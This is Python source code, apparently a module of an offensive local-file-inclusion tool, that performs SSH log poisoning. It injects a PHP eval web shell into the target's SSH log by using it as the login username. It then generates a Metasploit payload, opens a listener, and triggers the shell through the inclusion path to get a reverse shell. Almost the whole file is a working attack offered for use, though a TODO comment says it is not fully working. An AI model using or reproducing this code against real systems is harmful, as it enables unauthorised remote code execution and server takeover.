from os import system
from urllib import parse

from .utils import listener, attack, colors, cook, msf_payload


from .Detection import Detection

#TODO: Not working properly. Fix this
class SSHLogs:
    def __init__(self, args):

        self.target = args.url
        self.location = args.location
        self.relative = args.relative
        self.cookies = args.cookies
        self.detection = args.detection

    def attack(self, payload):
        host = parse.urlsplit(self.target).netloc
        system('/usr/bin/ssh "{0}@{1}"'.format(payload, host))

        if self.cookies:
            f_cookies = cook(self.cookies)
            response = attack(self.target, self.location, cookies=f_cookies)
        else:
            response = attack(self.target, self.location)
        return response

    def execute_ssh(self):
        if self.detection:
            detector = Detection(self)
            detector.detect()
            return

        lhost, lport, shell = msf_payload()

        handle = listener(lhost, lport)
        handle.handler()

        with open('/tmp/{0}.php'.format(shell), 'r') as f:
            payload_stage2 = parse.quote(f.read())

        payload = "<?php eval(\\$_GET['code'])?>"

        print(colors("[~] Start SSH Log Poisoning ...", 93))

        host = parse.urlsplit(self.target).netloc
        system('/usr/bin/ssh "{0}@{1}"'.format(payload, host))

        print(colors("[~] Executing Shell!",93))

        """ Attempt traverse """
        self.location = self.location + '&code={0}'.format(payload_stage2)
        if self.cookies:
            f_cookies = cook(self.cookies)
            attack(self.target, self.location, cookies=f_cookies)
        else:
            attack(self.target, self.location)
